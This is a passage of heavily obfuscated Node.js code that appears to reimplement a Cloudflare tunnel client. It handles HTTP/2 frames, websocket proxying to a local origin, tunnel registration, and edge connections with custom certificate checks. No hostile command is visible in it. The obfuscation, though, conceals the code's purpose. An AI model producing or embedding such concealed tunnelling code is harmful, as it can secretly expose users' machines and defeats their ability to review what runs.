                    o
                ]);
            }
            const h = c[gL(0x131)](a0aR, f), i = c['zfNcD'](d[gL(0xaa2)], 0x65) ? 0xc8 : d[gL(0xaa2)], j = [
                    [
                        c[gL(0x4ba)],
                        c[gL(0x131)](String, i)
                    ],
                    ...g,
                    [
                        c[gL(0x8fd)],
                        h
                    ],
                    [
                        'cf-cloudflared-response-meta',
                        c[gL(0x849)]
                    ]
                ];
            this['sendHeaders'](a, j);
            for await (const p of d[gL(0x341)]) {
                await this['sendData'](a, p, ![]);
            }
            await this['sendData'](a, Buffer[gL(0x2d9)](0x0), !![]);
        } catch (q) {
            this[gL(0x305)]['warning'](c[gL(0x8bc)](c[gL(0x8bc)](c[gL(0x6c2)](c[gL(0x41c)], a), '\x20proxy\x20failed:\x20'), q));
            try {
                this[gL(0x778)](a, [[
                        gL(0x7a3),
                        c[gL(0x6d0)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0cm(0x6fd)]() {
        const gM = a0cm, a = {
                'YnalF': gM(0xcb1),
                'QpzVw': function (d, f) {
                    return d + f;
                },
                'YqiNj': function (d, f) {
                    return d === f;
                },
                'NXhhv': function (d, f) {
                    return d & f;
                },
                'aJBdn': function (d, f) {
                    return d % f;
                },
                'YnMJk': gM(0x75c),
                'kcKvC': function (d, f) {
                    return d < f;
                },
                'OhlPg': function (d, f) {
                    return d >= f;
                },
                'IgFdh': function (d, f) {
                    return d <= f;
                },
                'TuYsA': function (d, f) {
                    return d === f;
                },
                'RDAXu': function (d, f) {
                    return d !== f;
                },
                'ekjza': function (d, f) {
                    return d === f;
                },
                'eDAcZ': function (d, f) {
                    return d + f;
                }
            }, b = await this[gM(0x1c3)][gM(0xd34)](0x18);
        if (!b[gM(0x20b)](Buffer[gM(0x1e7)](gM(0xa95))))
            throw new Error(a[gM(0x150)]);
        const c = Buffer[gM(0x2d9)](0x6);
        c[gM(0xa21)](0x3, 0x0), c[gM(0xcf6)](0x64, 0x2), this[gM(0x5ad)](0x4, 0x0, 0x0, c);
        this[gM(0xb8c)] && !this[gM(0x73e)][gM(0x7ff)] && (process[gM(0x288)]['write'](a['QpzVw'](this[gM(0xcb6)], '\x0a')), this[gM(0x73e)]['printed'] = !![]);
        try {
            while (!this[gM(0x691)]) {
                const [d, f, g, h] = await this[gM(0xb40)]();
                if (a[gM(0x3ad)](d, 0x4)) {
                    if (!a[gM(0x3bb)](f, 0x1)) {
                        if (a[gM(0xd6e)](h[gM(0x55c)], 0x6))
                            throw new Error(a[gM(0xb63)]);
                        for (let i = 0x0; a[gM(0x115)](i, h[gM(0x55c)]); i += 0x6) {
                            const j = h[gM(0xe5)](i), k = h['readUInt32BE'](a['QpzVw'](i, 0x2));
                            if (j === 0x4) {
                                const l = k - 0xffff;
                                for (const m of this['streamWindows'][gM(0x40f)]()) {
                                    this[gM(0x9c1)][gM(0x689)](m, Math['max'](0x0, a[gM(0x980)](this[gM(0x9c1)]['get'](m), l)));
                                }
                            } else
                                j === 0x5 && a[gM(0x54f)](k, 0x4000) && a['IgFdh'](k, 0xffffff) && (this[gM(0xd71)] = k);
                        }
                        this[gM(0x5ad)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[gM(0x7b4)](d, 0x6)) {
                    !(f & 0x1) && this[gM(0x5ad)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[gM(0x7b4)](d, 0x8)) {
                    if (a[gM(0xcdc)](h[gM(0x55c)], 0x4))
                        continue;
                    const n = h[gM(0xbfa)](0x0) & 0x7fffffff;
                    a[gM(0x4e4)](g, 0x0) ? this[gM(0x6b3)] += n : this['streamWindows'][gM(0x689)](g, a[gM(0xcbf)](this[gM(0x9c1)][gM(0x81a)](g) ?? 0xffff, n));
                    this['_notifyWindows']();
                    continue;
                }
                if (d === 0x3) {
                    this['streams'][gM(0xcfe)](g);
                    continue;
                }
                if (a['ekjza'](d, 0x7))
                    break;
                if (d === 0x1) {
                    const o = await this[gM(0x2bb)](f, g, h);
                    !this[gM(0x9c1)][gM(0x314)](g) && this[gM(0x9c1)]['set'](g, 0xffff);
                    this[gM(0x794)](g, f, o);
                    continue;
                }
                if (a[gM(0x7b4)](d, 0x0)) {
                    this[gM(0x5e0)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[gM(0x691)] = !![], this[gM(0x168)]();
            for (const p of this[gM(0x907)][gM(0xbf5)]()) {
                p['websocketProxy'] && p[gM(0xa4c)]['stop']();
            }
            try {
                this[gM(0x4e3)][gM(0xaeb)]();
            } catch (q) {
            }
        }
    }
    ['handleHeaders'](a, b, c) {
        const gN = a0cm, d = {
                'KnHtE': function (i, j) {
                    return i === j;
                },
                'sBJUb': gN(0x282),
                'eaFIg': gN(0x226),
                'sYDam': gN(0xc54),
                'SfRNw': gN(0x350),
                'pxqqT': ':protocol',
                'druuw': function (i, j) {
                    return i(j);
                },
                'slqpo': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i[gN(0x830)](':') ? f[i] = j : f[i[gN(0x426)]()] = j;
        }
        const g = (f[a0am] || '')[gN(0x58a)]()['toLowerCase']();
        if (d['KnHtE'](g, a0an)) {
            this[gN(0x4b9)](a);
            b & 0x1 && (this['control']['finished'] = !![]);
            return;
        }
        const h = {
            'method': f[d[gN(0xa88)]] || d[gN(0xc15)],
            'path': f[d[gN(0x7b6)]] || '/',
            'authority': f[d[gN(0xa66)]] || '',
            'headers': c[gN(0x88f)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': g === gN(0x51f) || d[gN(0x564)]((f[d[gN(0x582)]] || '')[gN(0x426)](), gN(0x51f)),
            'ended': d[gN(0xab7)](Boolean, d[gN(0x9c0)](b, 0x1)),
            'finished': ![]
        };
        this[gN(0x907)][gN(0x689)](a, h);
        if (h[gN(0x51f)])
            h['websocketProxy'] = new a0aU(this, a, h, this[gN(0x95a)], this['log']), h[gN(0xa4c)]['start']();
        else
            h[gN(0xbd8)] && this[gN(0xab1)](a, h);
    }
    [a0cm(0x5e0)](a, b, c) {
        const gO = a0cm, d = {
                'TWdLU': function (g, h) {
                    return g !== h;
                },
                'hkIKo': function (g, h) {
                    return g & h;
                },
                'yLwXO': function (g, h) {
                    return g === h;
                },
                'YLmSF': function (g, h) {
                    return g !== h;
                },
                'ihqwG': function (g, h) {
                    return g(h);
                }
            };
        this['sendWindowUpdate'](0x0, c[gO(0x55c)]), this[gO(0x21e)](a, c[gO(0x55c)]);
        if (d[gO(0x423)](this[gO(0x10f)], null) && this[gO(0x10f)][gO(0x80f)] === a) {
            this[gO(0x10f)][gO(0x41f)](c);
            d[gO(0x4dd)](b, 0x1) && (this[gO(0x10f)][gO(0xc50)] = !![]);
            return;
        }
        const f = this[gO(0x907)][gO(0x81a)](a);
        if (d[gO(0xd54)](f, undefined))
            return;
        if (d[gO(0xc95)](f[gO(0xa4c)], undefined)) {
            f[gO(0xa4c)]['feed'](c, d[gO(0x5a6)](Boolean, d[gO(0x4dd)](b, 0x1)));
            return;
        }
        c[gO(0x55c)] && f[gO(0x341)][gO(0x1d5)](c), d['hkIKo'](b, 0x1) && (f[gO(0xbd8)] = !![], this[gO(0xab1)](a, f));
    }
}
class a0aU {
    constructor(a, b, c, d, f) {
        const gP = a0cm, g = { 'opMQj': gP(0x5dc) }, h = g[gP(0x9bb)][gP(0xb0c)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this[gP(0x4e3)] = null;
                continue;
            case '1':
                this[gP(0x95a)] = d;
                continue;
            case '2':
                this[gP(0x691)] = ![];
                continue;
            case '3':
                this[gP(0x80f)] = b;
                continue;
            case '4':
                this[gP(0xb5e)] = a;
                continue;
            case '5':
                this[gP(0xd79)] = [];
                continue;
            case '6':
                this[gP(0x16e)] = c;
                continue;
            case '7':
                this[gP(0x5de)] = [];
                continue;
            case '8':
                this['log'] = f;
                continue;
            }
            break;
        }
    }
    [a0cm(0xae2)]() {
        const gQ = a0cm;
        this[gQ(0x6fd)]()[gQ(0xd7b)](() => {
        });
    }
    ['feed'](a, b = ![]) {
        const gR = a0cm;
        a['length'] && this['queue'][gR(0x1d5)](a), b && this[gR(0xd79)][gR(0x1d5)](null), this['_wake']();
    }
    [a0cm(0x2e8)]() {
        const gS = a0cm, a = {
                'FFAII': function (b, c) {
                    return b !== c;
                }
            };
        if (this[gS(0x691)])
            return;
        this[gS(0x691)] = !![], this[gS(0x337)]();
        if (a[gS(0x126)](this[gS(0x4e3)], null))
            try {
                this[gS(0x4e3)][gS(0xaeb)]();
            } catch (b) {
            }
    }
    [a0cm(0x337)]() {
        const gT = a0cm, a = {
                'oJheV': function (b) {
                    return b();
                }
            };
        for (const b of this['waiters']) {
            a[gT(0x50a)](b);
        }
        this['waiters'] = [];
    }
    async [a0cm(0x99c)]() {
        const gU = a0cm;
        while (!this[gU(0x691)]) {
            if (this[gU(0xd79)][gU(0x55c)])
                return this[gU(0xd79)][gU(0x3b0)]();
            await new Promise(a => this['waiters'][gU(0x1d5)](a));
        }
        return null;
    }
    async [a0cm(0x6fd)]() {
        const gV = a0cm, a = {
                'qObKk': function (b, c) {
                    return b(c);
                },
                'CwwzC': function (b, c) {
                    return b === c;
                },
                'caobc': gV(0xbe5),
                'AOjNo': gV(0x860),
                'FmzdZ': gV(0x39f),
                'CsuYy': gV(0xb5e),
                'HUuZH': function (b, c) {
                    return b === c;
                },
                'ZhcmA': 'upgrade',
                'XYNnz': gV(0xb14),
                'rLeEf': gV(0x7a3),
                'mrZFi': gV(0x7b8),
                'vCtJp': function (b, c) {
                    return b + c;
                },
                'KFNZl': gV(0x578),
                'GAdDo': gV(0x8a9)
            };
        try {
            this['sock'] = await a[gV(0x118)](a0aW, this[gV(0x95a)]), this[gV(0x29c)]();
            const b = await a['qObKk'](a0aZ, this[gV(0x4e3)]), c = [], d = [];
            for (const [i, j] of b['headers']) {
                const k = i[gV(0x426)]();
                a[gV(0x4c4)](k, 'content-length') && d[gV(0x1d5)]([
                    k,
                    j
                ]);
                const l = k[gV(0x830)](a[gV(0x943)]) || k[gV(0x830)](a[gV(0x359)]) || k[gV(0x830)](a[gV(0xbf2)]) || k[gV(0x830)](':');
                (!l || k === a[gV(0x79b)] || a[gV(0x710)](k, a[gV(0x67a)]) || a['CwwzC'](k, a['XYNnz'])) && c[gV(0x1d5)]([
                    k,
                    j
                ]);
            }
            const f = a[gV(0x118)](a0aR, c), g = a[gV(0x4c4)](b[gV(0xaa2)], 0x65) ? 0xc8 : b[gV(0xaa2)], h = [
                    [
                        a[gV(0x690)],
                        a[gV(0x118)](String, g)
                    ],
                    ...d,
                    [
                        gV(0x6d6),
                        f
                    ],
                    [
                        gV(0xb53),
                        a[gV(0x84e)]
                    ]
                ];
            this[gV(0xb5e)][gV(0x778)](this[gV(0x80f)], h), this[gV(0x88c)]()[gV(0xd7b)](() => {
            }), await this[gV(0x3c6)](b['rest']);
        } catch (m) {
            this[gV(0x305)]['warning'](a[gV(0x761)](a['KFNZl'] + this[gV(0x80f)] + a[gV(0x8f0)], m));
            try {
                this[gV(0xb5e)][gV(0x778)](this[gV(0x80f)], [[
                        a[gV(0x690)],
                        '502'
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[gV(0x2e8)]();
        }
    }
    async [a0cm(0x3c6)](a) {
        const gW = a0cm;
        a[gW(0x55c)] && await this[gW(0xb5e)][gW(0x8e1)](this[gW(0x80f)], a, ![]);
        for await (const b of this[gW(0x4e3)]) {
            if (this['stopped'])
                break;
            await this[gW(0xb5e)][gW(0x8e1)](this['streamId'], b, ![]);
        }
        !this[gW(0x691)] && await this[gW(0xb5e)][gW(0x8e1)](this[gW(0x80f)], Buffer[gW(0x2d9)](0x0), !![]);
    }
    async [a0cm(0x88c)]() {
        const gX = a0cm, a = {
                'BYiJd': function (b, c) {
                    return b === c;
                }
            };
        while (!this['stopped']) {
            const b = await this[gX(0x99c)]();
            if (a['BYiJd'](b, null))
                return;
            try {
                this[gX(0x4e3)][gX(0x10b)](b);
            } catch (c) {
                this[gX(0x691)] = !![];
                return;
            }
        }
    }
    [a0cm(0x29c)]() {
        const gY = a0cm, a = {
                'yviHZ': function (i, j) {
                    return i + j;
                },
                'LUwcn': function (i, j) {
                    return i + j;
                },
                'zNFFh': gY(0x575),
                'qQMNZ': gY(0x735),
                'oMdvl': function (i, j) {
                    return i === j;
                },
                'yEwrR': gY(0x78f),
                'kvsXf': function (i, j) {
                    return i === j;
                },
                'MuTuv': gY(0xb5e),
                'uBqVK': gY(0xb0f),
                'zHrYN': function (i, j) {
                    return i === j;
                },
                'fvaLO': gY(0x5be),
                'sjtIs': gY(0x5ed),
                'OemGc': gY(0x38b),
                'tnFWf': gY(0x95a),
                'zPqMV': function (i, j) {
                    return i + j;
                },
                'oUeLo': gY(0x1c2),
                'CpjLn': 'Origin:\x20https://',
                'famqE': gY(0x4ff),
                'qoWAz': gY(0x5bd),
                'Eyuca': gY(0x128),
                'ZLPsW': gY(0xb71),
                'NYLKE': 'Upgrade:\x20websocket',
                'wkNBa': function (i, j) {
                    return i + j;
                },
                'vSSyq': '\x0d\x0a\x0d\x0a',
                'TjVkZ': 'latin1'
            }, b = new URL(this['origin']), c = this[gY(0x16e)][gY(0xa3d)][gY(0x830)]('/') ? this[gY(0x16e)][gY(0xa3d)] : a[gY(0xcc2)]('/', this[gY(0x16e)][gY(0xa3d)]), d = [a[gY(0x4bc)](a[gY(0xcc2)](a[gY(0x37c)], c), a[gY(0x5d7)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[gY(0x16e)][gY(0x258)]) {
            const k = i[gY(0x426)]();
            if (a[gY(0x470)](k, a['yEwrR']) || a['kvsXf'](k, a['MuTuv']) || k === a[gY(0xa73)] || a[gY(0xb8b)](k, a[gY(0x4c3)]) || a[gY(0x470)](k, a[gY(0xc9d)]))
                continue;
            if (a[gY(0xb8b)](k, a['OemGc']))
                f = !![];
            else {
                if (a['oMdvl'](k, 'sec-websocket-version'))
                    g = !![];
                else
                    a['zHrYN'](k, a[gY(0x25c)]) && (h = !![]);
            }
            d[gY(0x1d5)](a[gY(0x4bc)](a[gY(0xcc2)](i, ':\x20'), j));
        }
        d['push'](a[gY(0x8d4)](a['oUeLo'], b['host'])), !h && this[gY(0x16e)]['authority'] && d[gY(0x1d5)](a[gY(0xa13)] + this[gY(0x16e)][gY(0x880)]), !f && d[gY(0x1d5)](a[gY(0x84a)] + a0k['randomBytes'](0x10)[gY(0x7a0)](a[gY(0xb4e)])), !g && d[gY(0x1d5)](a[gY(0x4b5)]), d[gY(0x1d5)](a['ZLPsW']), d[gY(0x1d5)](a[gY(0x3d2)]), this['sock'][gY(0x10b)](Buffer[gY(0x1e7)](a['wkNBa'](d['join']('\x0d\x0a'), a[gY(0xb2e)]), a[gY(0x936)]));
    }
}
class a0aV {
    constructor(a, b, c, d = {}) {
        const gZ = a0cm, f = {
                'lfAqI': gZ(0x975),
                'BOypF': function (i, j) {
                    return i === j;
                }
            }, g = f[gZ(0x771)][gZ(0xb0c)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[gZ(0xb5e)] = a;
                continue;
            case '1':
                this['buffer'] = Buffer[gZ(0x2d9)](0x0);
                continue;
            case '2':
                this['log'] = c;
                continue;
            case '3':
                this['quicPreamble'] = f[gZ(0xbe9)](d['quic'], !![]);
                continue;
            case '4':
                this[gZ(0xc50)] = ![];
                continue;
            case '5':
                this[gZ(0x80f)] = b;
                continue;
            }
            break;
        }
    }
    [a0cm(0xae2)](a, b, c, d) {
        const h0 = a0cm, f = {
                'LtxbE': function (g, h) {
                    return g(h);
                },
                'LrRWM': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[h0(0xb5e)][h0(0x8e1)](this[h0(0x80f)], f[h0(0x210)](a0aC, 0x0), ![]), this[h0(0xb5e)][h0(0x8e1)](this[h0(0x80f)], f[h0(0xd60)](a0aD, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0cm(0x41f)](a) {
        const h1 = a0cm, b = {
                'HxsIH': function (f, g) {
                    return f(g);
                },
                'fDiVh': function (f, g) {
                    return f + g;
                },
                'OoTID': h1(0x4ce),
                'aCNua': h1(0x833),
                'Cwohe': function (f, g) {
                    return f + g;
                },
                'csTAF': h1(0x513)
            };
        this[h1(0x93f)] = this['buffer']['length'] ? Buffer[h1(0x5f9)]([
            this[h1(0x93f)],
            a
        ]) : a;
        let c, d;
        [c, d] = b['HxsIH'](a0aE, this[h1(0x93f)]), this[h1(0x93f)] = d;
        for (const f of c) {
            try {
                const g = a0aJ(f);
                if (g['bootstrap'])
                    continue;
                g['ok'] ? (this['log'][h1(0xd42)](b[h1(0x834)](b[h1(0xb18)], g[h1(0x988)] || b[h1(0x6d7)])), this[h1(0xb5e)][h1(0x698)] = !![]) : (this[h1(0x305)]['warning'](b['Cwohe']('tunnel\x20registration\x20failed:\x20', g[h1(0xaa0)] || b[h1(0xd50)])), this['connection'][h1(0x8cb)] = !![], this['connection'][h1(0x691)] = !![]);
            } catch (h) {
                this[h1(0x305)][h1(0x3a5)](b[h1(0x834)]('ignoring\x20control\x20RPC\x20message:\x20', h));
            }
        }
    }
}
function a0aW(a) {
    const h2 = a0cm, b = {
            'ibDxR': h2(0xaa0),
            'lprRn': function (c, d) {
                return c(d);
            },
            'MHdtX': function (c, d, f) {
                return c(d, f);
            },
            'yDHpg': function (c, d) {
                return c(d);
            },
            'zdQDr': h2(0x824),
            'sPDLx': h2(0x940),
            'NrmQe': function (c, d) {
                return c === d;
            },
            'RapZz': 'connect'
        };
    return new Promise((c, d) => {
        const h4 = h2, f = {
                'lUkeq': function (n, o, p) {
                    return n(o, p);
                },
                'Xgljd': function (n, o, p) {
                    const h3 = a0b;
                    return b[h3(0x906)](n, o, p);
                },
                'VWpwf': b[h4(0x1d0)],
                'fcudf': h4(0x2c7)
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b['yDHpg'](d, new Error(b[h4(0x638)]));
            return;
        }
        if (![
                h4(0xa67),
                b['sPDLx']
            ][h4(0x134)](g[h4(0x56f)]) || !g[h4(0xc18)]) {
            b[h4(0xcf9)](d, new Error(b[h4(0x638)]));
            return;
        }
        const h = b[h4(0x738)](g['protocol'], b[h4(0x9c5)]), i = g['port'] || (h ? 0x1bb : 0x50), j = a0i[h4(0x795)]({
                'host': g[h4(0xc18)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const h5 = h4;
                if (k)
                    return;
                k = !![], j[h5(0x779)](b[h5(0x1d0)], m), j['setTimeout'](0x0), b[h5(0xcf9)](o, p);
            }, m = o => {
                !k && f['lUkeq'](l, d, o);
            };
        j['on'](b[h4(0x1d0)], m), j[h4(0x1a4)](0x7530, () => j[h4(0xaeb)](new Error(h4(0x5f3)))), j['on'](b[h4(0x72d)], () => {
            const h7 = h4, o = {
                    'eSrwv': function (q, r, s) {
                        const h6 = a0b;
                        return f[h6(0x18d)](q, r, s);
                    }
                };
            if (!h) {
                l(c, j);
                return;
            }
            const p = a0j[h7(0x795)]({
                'socket': j,
                'servername': g['hostname']
            });
            p['on'](f[h7(0x6a2)], q => {
                !k && l(d, q);
            }), p['on'](f[h7(0xa83)], () => {
                const h8 = h7;
                o[h8(0xd10)](l, c, p);
            });
        });
    });
}
function a0aX(a) {
    const h9 = a0cm, b = {
            'KKpKq': function (d, f) {
                return d < f;
            },
            'Pqktj': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[h9(0x16b)](d, a[h9(0x902)][h9(0x55c)]); d += 0x2) {
        c[h9(0x1d5)]([
            a[h9(0x902)][d],
            a[h9(0x902)][b['Pqktj'](d, 0x1)]
        ]);
    }
    return c;
}
function a0aY(a, b, c, d, f) {
    const ha = a0cm, g = {
            'bfCKt': function (h, i) {
                return h(i);
            },
            'RjhGc': function (h, i) {
                return h(i);
            },
            'PvbjX': ha(0x824),
            'OomXv': ha(0xa67),
            'IIZsY': ha(0x940),
            'zSeJT': function (h, i) {
                return h(i);
            },
            'kkikp': function (h, i) {
                return h === i;
            },
            'ZYvfg': function (h, i) {
                return h === i;
            },
            'uSLLC': ha(0xb5e),
            'fjBjg': function (h, i) {
                return h === i;
            },
            'DERUc': function (h, i) {
                return h === i;
            },
            'kImzA': ha(0x5be),
            'lLuvb': ha(0x2a8),
            'sxUau': ha(0xb6e),
            'WurKH': ha(0xaa0)
        };
    return new Promise((h, i) => {
        const hb = ha;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            i(new Error(g['PvbjX']));
            return;
        }
        if (![
                g['OomXv'],
                g[hb(0x14f)]
            ][hb(0x134)](j[hb(0x56f)]) || !j[hb(0xc18)]) {
            g[hb(0xd9e)](i, new Error(g['PvbjX']));
            return;
        }
        const k = g[hb(0x800)](j['protocol'], g[hb(0x14f)]), l = j[hb(0x597)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r[hb(0x426)]();
            if (t === hb(0x78f) || g[hb(0xa84)](t, g[hb(0xa5c)]) || g[hb(0xa85)](t, 'transfer-encoding') || g[hb(0x5f5)](t, g[hb(0x25f)]))
                continue;
            m[r] = s;
        }
        m[g['lLuvb']] = j[hb(0x78f)];
        f[hb(0x55c)] && (m[g['sxUau']] = g[hb(0xab2)](String, f[hb(0x55c)]));
        const n = c[hb(0x830)]('/') ? c : '/' + c, o = k ? a0h : a0g, p = o[hb(0x16e)]({
                'hostname': j[hb(0xc18)],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const hc = hb;
                g[hc(0xab2)](h, {
                    'status': u[hc(0x16d)],
                    'headers': g[hc(0xb02)](a0aX, u),
                    'body': u
                });
            });
        p['on'](g[hb(0xd0a)], u => i(u)), p[hb(0x536)](f['length'] ? f : undefined);
    });
}
function a0aZ(a) {
    const hd = a0cm, b = {
            'WEmtB': hd(0x5f8),
            'XnPLN': 'end',
            'Kphhn': hd(0x7bc),
            'Eqhik': function (c) {
                return c();
            },
            'QAvdv': function (c, d) {
                return c > d;
            },
            'XBvBp': function (c, d) {
                return c(d);
            },
            'TFFxS': hd(0x6e6),
            'bKDgY': 'error'
        };
    return new Promise((c, d) => {
        const he = hd, f = {
                'HTMHi': b[he(0xd67)],
                'aEUzR': he(0xaa0),
                'CcZpA': b['XnPLN'],
                'zUZMg': b[he(0x3b8)],
                'lIVBO': function (l, m) {
                    return l < m;
                },
                'TrQGq': function (l) {
                    const hf = he;
                    return b[hf(0x491)](l);
                },
                'XLrLa': function (l, m, n) {
                    return l(m, n);
                },
                'MxmhJ': function (l, m) {
                    const hg = he;
                    return b[hg(0x2c8)](l, m);
                },
                'QveLX': function (l, m) {
                    return l + m;
                },
                'gJSsR': function (l, m) {
                    const hh = he;
                    return b[hh(0x8c5)](l, m);
                },
                'GWzzd': function (l, m) {
                    return l + m;
                },
                'MjdtJ': b[he(0xb79)]
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const hi = he;
                a[hi(0x779)](f['HTMHi'], i), a['removeListener'](f[hi(0xa70)], j), a[hi(0x779)](f[hi(0x8a5)], k), a[hi(0x779)](f[hi(0x3ef)], k);
            }, i = l => {
                const hj = he;
                g = g[hj(0x55c)] ? Buffer[hj(0x5f9)]([
                    g,
                    l
                ]) : l;
                const m = g[hj(0x1eb)](hj(0xbe0));
                if (f[hj(0xc45)](m, 0x0))
                    return;
                f[hj(0x52b)](h);
                const n = g[hj(0x262)](0x0, m)[hj(0x7a0)](hj(0xa0b)), o = n[hj(0xb0c)]('\x0d\x0a'), p = o[0x0][hj(0xb0c)]('\x20'), q = f[hj(0x286)](parseInt, p[0x1], 0xa);
                if (!Number[hj(0x53b)](q)) {
                    d(new Error(hj(0x640)));
                    return;
                }
                const r = [];
                for (let s = 0x1; f['lIVBO'](s, o[hj(0x55c)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[hj(0x1eb)](':');
                    f['MxmhJ'](u, 0x0) && r[hj(0x1d5)]([
                        t[hj(0x2d5)](0x0, u)[hj(0x58a)](),
                        t['slice'](f['QveLX'](u, 0x1))[hj(0x58a)]()
                    ]);
                }
                f[hj(0x32a)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[hj(0x262)](f['GWzzd'](m, 0x4))
                });
            }, j = l => {
                const hk = he;
                h(), f[hk(0x32a)](d, l);
            }, k = () => {
                const hl = he;
                h(), f[hl(0x32a)](d, new Error(f['MjdtJ']));
            };
        a['on'](b[he(0xd67)], i), a['on'](b[he(0xaf2)], j), a['on'](he(0x536), k), a['on'](b[he(0x3b8)], k);
    });
}
function a0b0(a) {
    const hm = a0cm, b = {
            'mMwsc': 'dns:',
            'NlVOq': function (f, g) {
                return f === g;
            },
            'YbTDw': 'cftunnel.com',
            'skBXq': 'h2.cftunnel.com',
            'CndJL': 'CloudFlare,\x20Inc.',
            'LadFt': function (f, g) {
                return f + g;
            },
            'udjDx': hm(0x187),
            'LMWOY': 'CloudFlare\x20Origin\x20SSL',
            'gBAIF': function (f, g) {
                return f + g;
            },
            'IotUl': hm(0xd5d),
            'bTnMs': function (f, g) {
                return f !== g;
            },
            'fUHvF': hm(0x9b2),
            'oCCBX': hm(0x4b0)
        };
    if (!a || !a[hm(0x5a0)])
        return hm(0x994);
    if (a[hm(0x5a0)]['O'] !== b[hm(0xd1f)])
        return b[hm(0x868)](b[hm(0xd65)], a[hm(0x5a0)]['O'] || '');
    if (!String(a[hm(0x5a0)]['OU'] || '')[hm(0x830)](b[hm(0x54b)]))
        return b[hm(0xa30)](b[hm(0x41e)], a[hm(0x5a0)]['OU'] || '');
    if (!a[hm(0x162)] || b['bTnMs'](a[hm(0x162)]['CN'], b[hm(0x3de)]))
        return b['oCCBX'];
    const c = String(a[hm(0xb6c)] || '')[hm(0xb0c)](',')[hm(0x8a0)](f => f[hm(0x58a)]()[hm(0x426)]()), d = c[hm(0x758)](f => {
            const hn = hm;
            if (!f[hn(0x830)](b[hn(0x817)]))
                return ![];
            const g = f[hn(0x2d5)](0x4);
            return b[hn(0xbbf)](g, hn(0x8f5)) || g === b[hn(0x289)] || g[hn(0x830)]('*.') && b['skBXq'][hn(0xb13)](g[hn(0x2d5)](0x1));
        });
    if (!d)
        return hm(0xb06);
    return null;
}
function a0b1(a, b) {
    const ho = a0cm, c = {
            'dBWjk': 'edge\x20certificate\x20verification\x20failed:\x20',
            'znShd': function (h, i) {
                return h !== i;
            },
            'vBeak': 'edge\x20did\x20not\x20negotiate\x20h2',
            'sQDdL': function (h, i) {
                return h + i;
            },
            'ztMhg': ho(0x708),
            'oiHvM': function (h, i) {
                return h + i;
            },
            'LRhfD': function (h, i) {
                return h + i;
            },
            'kMWIU': ho(0xcbe),
            'aLrCA': ho(0x8a9),
            'qTjWC': function (h) {
                return h();
            }
        }, d = a0ak[ho(0x2d5)]()['sort'](() => Math['random']() - 0.5);
    let f = null;
    const g = async () => {
        const ht = ho;
        for (const h of d) {
            try {
                return await new Promise((i, j) => {
                    const hp = a0b, k = {
                            'XRuja': function (m, n) {
                                return m(n);
                            },
                            'eEZHq': c[hp(0x5b0)],
                            'SYzEn': function (m, n) {
                                const hq = hp;
                                return c[hq(0x313)](m, n);
                            },
                            'DiNEx': c[hp(0x319)],
                            'Cwhxp': function (m, n) {
                                const hr = hp;
                                return c[hr(0xc57)](m, n);
                            },
                            'Kagtq': c[hp(0xdb0)]
                        }, l = a0j[hp(0x795)]({
                            'host': h,
                            'port': a0al,
                            'ALPNProtocols': ['h2'],
                            'servername': hp(0x8f5),
                            'rejectUnauthorized': ![]
                        });
                    l['setTimeout'](0x2710, () => l['destroy'](new Error(hp(0x2b4)))), l['on']('error', j), l['on'](hp(0x2c7), () => {
                        const hs = hp;
                        if (a) {
                            const n = k[hs(0x714)](a0b0, l[hs(0x11d)](![]));
                            if (n) {
                                l[hs(0xaeb)](new Error(k[hs(0xd7a)] + n));
                                return;
                            }
                        }
                        const m = l[hs(0xd66)];
                        if (m && k[hs(0xc0c)](m, 'h2')) {
                            l['destroy'](new Error(k[hs(0x7d0)]));
                            return;
                        }
                        a0c7 > 0x0 ? l[hs(0x1a4)](a0c7, () => l[hs(0xaeb)](new Error(hs(0xa27)))) : l[hs(0x1a4)](0x0), b[hs(0xd42)](k[hs(0x1de)](k[hs(0x1de)](k['Kagtq'], h) + ':', a0al)), i(l);
                    });
                });
            } catch (i) {
                f = i, b[ht(0x756)](c[ht(0xa82)](c[ht(0x248)](c[ht(0xa82)](c[ht(0x18e)], h), c[ht(0x6cf)]), i));
            }
        }
        throw new Error(c[ht(0xa82)](ht(0xc43), f));
    };
    return c[ho(0xc01)](g);
}
const a0b2 = Buffer[a0cm(0x1e7)](a0cm(0x4ea), a0cm(0x47c)), a0b3 = Buffer[a0cm(0x1e7)](a0cm(0xb86), 'hex'), a0b4 = Buffer[a0cm(0x5f9)]([
        a0b2,
        Buffer[a0cm(0x1e7)]('01', a0cm(0xa0b))
    ]), a0b5 = Buffer[a0cm(0x5f9)]([
        a0b3,
        Buffer[a0cm(0x1e7)]('01', a0cm(0xa0b))
    ]), a0b6 = {
        'http': 0x0,
        'websocket': 0x1,
        'tcp': 0x2
